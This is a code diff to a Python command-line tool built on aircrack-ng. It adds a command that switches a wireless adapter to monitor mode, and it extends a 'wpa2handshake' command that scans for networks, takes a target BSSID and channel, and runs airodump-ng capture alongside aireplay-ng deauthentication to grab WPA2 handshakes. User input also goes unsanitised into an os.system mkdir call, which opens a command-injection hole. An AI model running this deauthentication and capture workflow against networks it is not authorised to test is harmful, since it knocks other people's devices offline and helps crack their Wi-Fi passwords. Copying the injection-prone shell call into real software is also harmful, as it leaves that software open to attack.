@@ -11,15 +11,36 @@ app = typer.Typer()
 
 # add a decorator @typer.command() before a function declaration to designate that function as a command in CLI application.
 @app.command()
+def modemon():
+    print("Switching the network adapter to monitor mode")
+    print("---------------------------------------------------------------------")
+    os.system("airmon-ng check kill")
+    os.system("airmon-ng start wlan0")
+    os.system("ifconfig")
+    print("---------------------------------------------------------------------\n\n\n")
+
+
+@app.command()
 def wpa2handshake():  # pass a parameter for the function
+    print("Check if in monitor mode")
+    print("---------------------------------------------------------------------")
+    os.system("ifconfig")
+    print("---------------------------------------------------------------------")
+
     global packageName
+
+    # list the networks
+    os.system("airodump-ng --band abg wlan0mon")
+
     packageName = input("Name of directory to save the package: ")
+    BSSID = input("Enter the BSSID of any network to be sniffed: ")
+    channel = input("Enter the channel this network is working on: ")
     os.system("mkdir SniffedNetworkData/" + packageName)
 
     capFile_name = input("Enter the name to be assigned to the wireshark capture file: ")
 
     # Define your commands
-    command1 = ["airodump-ng", "-c", channel, "--bssid", BSSID, "-w", "DataGenerated/" + packageName + "/" + capFile_name, "wlan0mon"]
+    command1 = ["airodump-ng", "-c", channel, "--bssid", BSSID, "-w", "SniffedNetworkData/" + packageName + "/" + capFile_name, "wlan0mon"]
     command2 = ["aireplay-ng", "-0", "10", "-a", BSSID, "wlan0mon"]
 
     # Run both commands simultaneously in the background
@@ -72,13 +93,6 @@ def commands():
 
 # at the start of the python application we are calling the object
 def main():
-    print("Switching the network adapter to monitor mode")
-    print("---------------------------------------------------------------------")
-    os.system("airmon-ng check kill")
-    os.system("airmon-ng start wlan0")
-    os.system("ifconfig")
-    print("---------------------------------------------------------------------\n\n\n")
-
     app()
 
 
